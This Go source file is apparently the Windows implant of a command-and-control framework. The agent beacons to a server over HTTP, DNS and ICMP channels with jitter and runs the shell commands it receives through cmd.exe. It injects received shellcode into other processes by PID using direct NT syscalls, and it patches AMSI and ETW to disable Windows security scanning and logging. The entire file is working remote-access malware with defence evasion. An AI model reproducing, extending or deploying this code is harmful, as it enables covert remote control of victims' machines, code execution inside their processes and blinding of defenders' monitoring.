//go:build windows

package agent

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os/exec"
	"time"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
	"github.com/VoidSecSoftwares/voidsyscall/patches"
	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

type Agent struct {
	config   *Config
	channels []channels.Channel
	running  bool
	ctx      context.Context
	cancel   context.CancelFunc
}

type TaskType uint8

const (
	TaskShell    TaskType = 0x01
	TaskInject   TaskType = 0x02
	TaskPatch    TaskType = 0x03
	TaskSleep    TaskType = 0x04
	TaskExit     TaskType = 0xFF
)

type TaskResult struct {
	TaskID [16]byte
	Status uint8
	Output []byte
}

func New(cfg *Config) (*Agent, error) {
	a := &Agent{
		config:  cfg,
		running: true,
	}
	a.ctx, a.cancel = context.WithCancel(context.Background())

	if err := syscallwin.InitNtdll(); err != nil {
		return nil, fmt.Errorf("init ntdll: %w", err)
	}

	for _, chType := range cfg.Channels {
		ch, err := channels.New(channels.ChannelType(chType), &channels.Config{
			HTTPAddr:   cfg.ServerAddr,
			HTTPSPort:  443,
			DNSAddr:    cfg.ServerAddr,
			DNSPort:    53,
			ICMPAddr:   cfg.ServerAddr,
			BeaconPath: cfg.BeaconPath,
			JitterMin:  cfg.JitterMin,
			JitterMax:  cfg.JitterMax,
			Key:        cfg.Key,
			UserAgent:  cfg.UserAgent,
			TimeoutSec: 10,
			MaxRetries: 3,
		})
		if err != nil {
			continue
		}
		a.channels = append(a.channels, ch)
	}

	if len(a.channels) == 0 {
		return nil, fmt.Errorf("no valid channels configured")
	}

	return a, nil
}

func (a *Agent) Run() {
	for a.running {
		task := a.beacon()
		if task == nil {
			a.sleep()
			continue
		}

		result := a.executeTask(task)
		a.sendResult(result)

		a.sleep()
	}
}

func (a *Agent) beacon() *channels.Message {
	for _, ch := range a.channels {
		msg := &channels.Message{
			Type: 0x01, // Beacon
			Data: nil,
		}
		copy(msg.ID[:], a.config.AgentID)

		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		resp, err := ch.Send(ctx, msg)
		cancel()

		if err != nil {
			continue
		}
		return resp
	}
	return nil
}

func (a *Agent) executeTask(task *channels.Message) *TaskResult {
	result := &TaskResult{}
	copy(result.TaskID[:], task.ID[:])

	if len(task.Data) < 1 {
		result.Status = 0x01 // Error
		result.Output = []byte("empty task data")
		return result
	}

	taskType := TaskType(task.Data[0])
	taskData := task.Data[1:]

	switch taskType {
	case TaskShell:
		return a.handleShell(task, result, taskData)
	case TaskInject:
		return a.handleInject(task, result, taskData)
	case TaskPatch:
		return a.handlePatch(task, result, taskData)
	case TaskSleep:
		return a.handleSleep(task, result, taskData)
	case TaskExit:
		a.running = false
		result.Status = 0x00
		result.Output = []byte("exiting")
		return result
	default:
		result.Status = 0x01
		result.Output = []byte(fmt.Sprintf("unknown task type: %d", taskType))
		return result
	}
}

func (a *Agent) handleShell(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	cmd := string(data)
	if cmd == "" {
		result.Status = 0x01
		result.Output = []byte("empty command")
		return result
	}

	out, err := exec.Command("cmd.exe", "/C", cmd).CombinedOutput()
	if err != nil {
		result.Status = 0x01
		result.Output = append([]byte(err.Error()), '\n')
		result.Output = append(result.Output, out...)
		return result
	}

	result.Status = 0x00
	result.Output = out
	return result
}

func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("inject: need at least 4 bytes (PID + shellcode)")
		return result
	}

	pid := binary.LittleEndian.Uint32(data[:4])
	shellcode := data[4:]

	// Simple injection — write + CreateThread in target
	var clientID syscallwin.ClientId
	clientID.UniqueProcess = uintptr(pid)

	var processHandle uintptr
	err := syscallwin.NtOpenProcess(&processHandle, syscallwin.PROCESS_ALL_ACCESS, 0, &clientID)
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	defer syscallwin.NtClose(processHandle)

	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	err = syscallwin.NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize,
		syscallwin.MEM_COMMIT|syscallwin.MEM_RESERVE, syscallwin.PAGE_EXECUTE_READWRITE)
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	var written uintptr
	err = syscallwin.NtWriteVirtualMemory(processHandle, baseAddress, shellcode, &written)
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	var threadHandle uintptr
	err = syscallwin.NtCreateThreadEx(&threadHandle, syscallwin.THREAD_ALL_ACCESS, 0,
		processHandle, baseAddress, 0, 0, 0, 0, 0, 0)
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	defer syscallwin.NtClose(threadHandle)

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d", len(shellcode), pid))
	return result
}

func (a *Agent) handlePatch(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("patch: specify what to patch")
		return result
	}

	patchType := data[0]

	switch patchType {
	case 0x01: // AMSI
		if err := patches.PatchAMSI(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("AMSI patched")
	case 0x02: // ETW
		if err := patches.PatchETW(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("ETW patched")
	case 0x03: // Both
		success, failed := patches.ApplyCriticalPatches()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("success: %v, failed: %v", success, failed))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown patch type")
	}

	return result
}

func (a *Agent) handleSleep(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("sleep: need 4 bytes (uint32 seconds)")
		return result
	}

	secs := binary.LittleEndian.Uint32(data[:4])
	a.config.Sleep = int(secs)

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("sleep set to %d seconds", secs))
	return result
}

func (a *Agent) sendResult(result *TaskResult) {
	msg := &channels.Message{
		Type: 0x02, // Result
		Data: append([]byte{result.Status}, result.Output...),
	}
	copy(msg.ID[:], result.TaskID[:])

	for _, ch := range a.channels {
		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		_, _ = ch.Send(ctx, msg)
		cancel()
	}
}

func (a *Agent) sleep() {
	sleepTime := time.Duration(a.config.Sleep) * time.Second
	jitter := time.Duration(rand.Intn(a.config.JitterMax-a.config.JitterMin)+a.config.JitterMin) * time.Second
	total := sleepTime + jitter

	timer := time.NewTimer(total)
	defer timer.Stop()

	select {
	case <-a.ctx.Done():
		return
	case <-timer.C:
		return
	}
}

func (a *Agent) Stop() {
	a.running = false
	a.cancel()
}
